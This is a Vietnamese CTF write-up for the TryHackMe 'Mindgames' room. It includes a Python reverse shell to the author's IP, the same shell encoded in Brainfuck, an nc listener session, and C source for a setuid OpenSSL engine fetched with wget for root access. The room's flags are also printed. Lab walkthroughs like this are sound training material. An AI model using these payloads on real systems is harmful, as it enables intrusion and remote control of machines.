---
title: "Tryhackme - Mindgames"
date: "2022-05-10"
tags: [
    "web",
    "linux",
    "brainfuck",
    "openssl",
    "capabilities"
]
---

Xin chào, lại là tôi đây. Hôm nay tôi sẽ giải CTF [TryHackMe | Mindgames](https://tryhackme.com/room/mindgames)
## Reconnaissance and Scanning

```python
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDffdMrJJJtZTQTz8P+ODWiDoe6uUYjfttKprNAGR1YLO6Y25sJ5JCAFeSfDlFzHGJXy5mMfV5fWIsdSxvlDOjtA4p+P/6Z2KoYuPoZkfhOBrSUZklOig4gF7LIakTFyni4YHlDddq0aFCgHSzmkvR7EYVl9qfxnxR0S79Q9fYh6NJUbZOwK1rEuHIAODlgZmuzcQH8sAAi1jbws4u2NtmLkp6mkacWedmkEBuh4YgcyQuh6jO+Qqu9bEpOWJnn+GTS3SRvGsTji+pPLGnmfcbIJioOG6Ia2NvO5H4cuSFLf4f10UhAC+hHy2AXNAxQxFCyHF0WVSKp42ekShpmDRpP
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNlJ1UQ0sZIFC3mf3DFBX0chZnabcufpCZ9sDb7q2zgiHsug61/aTEdedgB/tpQpLSdZi9asnzQB4k/vY37HsDo=
|   256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrqeEIugx9liy4cT7tDMBE59C9PRlEs2KOizMlpDM8h
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Truy cập vào port 80 với web service.

Web này có sử dụng một loại mật mã là [BrainFuck](https://vi.wikipedia.org/wiki/Brainfuck). Với 2 ví dụ được đề cập trên trang web, ở ví dụ số 2 về dãy số Fibonacci

```python
--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.
```

Khi chạy đoạn mã này sẽ ra dãy số Fibonacci

```
1
1
2
3
5
8
13
21
34
55
```

Tuy nhiên khi tôi thử decode đoạn brainfuck trên nó lại là 1 đoạn code python 

```python
def F(n):
    if n <= 1:
        return 1
    return F(n-1)+F(n-2)

for i in range(10):
    print(F(i))
```

Điều này có nghĩa là backend có thể xử lý được code python nhập vào. 

## RCE

Vậy thì tôi sẽ thử tạo 1 [python reverse shell](https://www.revshells.com/) 

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.105.194",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

Tiếp theo là convert nó sang brainfuck

```python
>++++++++++[<++++++++++>-]<+++++.++++.+++.-.+++.++.>+++++++++[<--------->-]<---.>+++++++++[<+++++++++>-]<++.----.>+++[<--->-]<---.++++++++.------.>++++[<++++>-]<-.>++++++++[<-------->-]<--------.>++++++++[<++++++++>-]<+++++++.++.>++++[<---->-]<---.>++++[<++++>-]<--.++.---.>+++[<--->-]<---.++.>++++[<++++>-]<--..>++++++++[<-------->-]<-------.>++++++++[<++++++++>-]<+++.++++.>+++++++[<------->-]<-------.>+++++++[<+++++++>-]<+++++++.>+++++++[<------->-]<-----.>+++++++[<+++++++>-]<+++++.----.>+++[<--->-]<---.++++++++.------.>++++[<++++>-]<-.>++++++++[<-------->-]<------.>++++++++[<++++++++>-]<+++++.----.>+++[<--->-]<---.++++++++.------.>++++[<++++>-]<-.>+++++++++[<--------->-]<+++++.>+++++++++[<+++++++++>-]<------.----.>+++[<--->-]<---.++++++++.------.>++++[<++++>-]<-.>++++++++[<-------->-]<------.>++++[<++++>-]<+++.+++++.>+++++[<+++++>-]<.>+++++[<----->-]<+++.+++++.>+++[<--->-]<.>++++[<++++>-]<-.>++++++[<------>-]<----.>++++++++[<++++++++>-]<+++++++.----.>+++[<--->-]<---.++++++++.------.>++++[<++++>-]<-.>++++++++[<-------->-]<------.>++++++[<++++++>-]<+.----.>+++[<--->-]<---.++++++++.>++++[<++++>-]<++++.>+++[<--->-]<---.+.--.>++++[<---->-]<+++.----.>+++[<+++>-]<+++.>++++++[<------>-]<.>++++[<++++>-]<++.>+++++++[<+++++++>-]<+++++++.>++++++++[<-------->-]<-----.>+++++++[<+++++++>-]<++++.>+++[<+++>-]<+++.-..>+++[<--->-]<.--.>++++[<++++>-]<+.>+++++++++[<--------->-]<+++++..------.>++++[<++++>-]<-.-.--.>+++[<+++>-]<+.>+++[<--->-]<-.+++.-.+++++.-------.+++.++++++++.-----.>++++[<---->-]<--.>+++[<+++>-]<+.>++++[<++++>-]<---.>+++[<--->-]<..+.--------..>++++[<++++>-]<++.>+++++++[<+++++++>-]<+++.++++.>++++++++[<-------->-]<-----.>+++++++[<+++++++>-]<+++++.>++++[<++++>-]<+.-----.>++++++++[<-------->-]<++.>+++[<--->-]<-.>+++++++++[<+++++++++>-]<------.>++++++++[<-------->-]<-----.>+++++++[<+++++++>-]<+++++++.+++.+++.-------.>+++[<+++>-]<.+.>++++++++[<-------->-]<-------.+.+++.++++.-------.>++++[<++++>-]<++.>+++++[<----->-]<--.>+++++++++[<+++++++++>-]<--.++++.>++++++++[<-------->-]<-----.>+++++++[<+++++++>-]<+++++.>++++[<++++>-]<+.-----.>++++++++[<-------->-]<++.>+++[<--->-]<-.>+++++++++[<+++++++++>-]<------.>++++++++[<-------->-]<-----.>+++++++[<+++++++>-]<+++++++.+++.+++.-------.>+++[<+++>-]<.+.>++++++++[<-------->-]<-------.+.+++.+++++.--------.>++++[<++++>-]<++.>+++++++[<+++++++>-]<+++.++++.>++++++++[<-------->-]<-----.>+++++++[<+++++++>-]<+++++.>++++[<++++>-]<+.-----.>++++++++[<-------->-]<++.>+++[<--->-]<-.>+++++++++[<+++++++++>-]<------.>++++++++[<-------->-]<-----.>+++++++[<+++++++>-]<+++++++.+++.+++.-------.>+++[<+++>-]<.+.>++++++++[<-------->-]<-------.+.+++.++++++.>+++[<--->-]<.>++++[<++++>-]<++.>+++++++[<+++++++>-]<---.++++.+++.-.+++.++.>+++++++++[<--------->-]<---.>+++++++++[<+++++++++>-]<-.++++.+++++.>++++++++[<-------->-]<++.>+++++[<----->-]<--.>+++++++++[<+++++++++>-]<-.++++.+++++.>+++++++++[<--------->-]<++++++.>++++++++[<++++++++>-]<+++++.---.>++++[<---->-]<+.>+++++[<+++++>-]<---.>+++[<--->-]<.>++++++++[<-------->-]<------.------.>+++++++++[<+++++++++>-]<.>+++[<--->-]<--.>++++++++[<-------->-]<------.+++++++.
```

Tiếp theo tạo listener với port 9001

Copy đoạn brainfuck trên vào input và Run it!

```python
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 9001   
listening on [any] 9001 ...
connect to [10.8.105.194] from (UNKNOWN) [10.10.198.28] 47296
$ id
id
uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)
$ 
```

Đã có RCE, việc tiếp theo là tìm user flag.

Máy này có 2 user là *mindgames* và *tryhackme* và user flag nằm trong dir của user có thể truy cập được là *mindgames*

```python
bash
mindgames@mindgames:~$ cd /home
cd /home
mindgames@mindgames:/home$ ls  
ls
mindgames  tryhackme
mindgames@mindgames:/home$ ls mindgames
ls mindgames
user.txt  webserver
mindgames@mindgames:/home$ cat mindgames/user.txt
cat mindgames/user.txt
thm{411f7d38247ff441ce4e134b459b6268}
mindgames@mindgames:/home$ 
```

## Privilege escalation

Sau khi thử 1 vài exploit cơ bản đều không có kết quả thì tôi quyết định upload [linpeas](https://github.com/carlospolop/PEASS-ng) lên máy để nó phân tích cho nhanh.

Sau khi quét xong, tôi để ý thấy có thể khai thác được Capabilities. Kiểm tra lại

```python
mindgames@mindgames:~$ getcap / -r 2>/dev/null
getcap / -r 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
mindgames@mindgames:~$ 
```

Tôi sẽ thử khai thác với `openssl`. Tìm kiếm nó tại [GTFObins](https://gtfobins.github.io/gtfobins/openssl/#library-load) 

```python
openssl req -engine ./lib.so
```

Tìm hiểu về Openssl một lúc và tôi tìm được cách khai thác dựa trên blog [Engine Building Lesson 1: A Minimum Useless Engine](https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/)

```python
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0);
    system("/bin/sh");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

```python
gcc -fPIC -o silly-engine.o -c silly-engine.c
gcc -shared -o silly-engine.so -lcrypto silly-engine.o
```

Đẩy file silly-engine.so lên máy victim

```python
python -m http.server 8888
```

Phía victim

```python
mindgames@mindgames:~/webserver$ wget http://10.8.105.194:8888/silly-engine.so
<rver$ wget http://10.8.105.194:8888/silly-engine.so
--2023-07-22 19:39:29--  http://10.8.105.194:8888/silly-engine.so
Connecting to 10.8.105.194:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15664 (15K) [application/octet-stream]
Saving to: ‘silly-engine.so’

silly-engine.so     100%[===================>]  15.30K  69.9KB/s    in 0.2s    

2023-07-22 19:39:29 (69.9 KB/s) - ‘silly-engine.so’ saved [15664/15664]

mindgames@mindgames:~/webserver$ openssl req -engine ./silly-engine.so
openssl req -engine ./silly-engine.so
# id
id
uid=0(root) gid=1001(mindgames) groups=1001(mindgames)
# bash
bash
root@mindgames:~/webserver# cat /root/root.txt
cat /root/root.txt
thm{1974a617cc84c5b51411c283544ee254}
root@mindgames:~/webserver# 
```
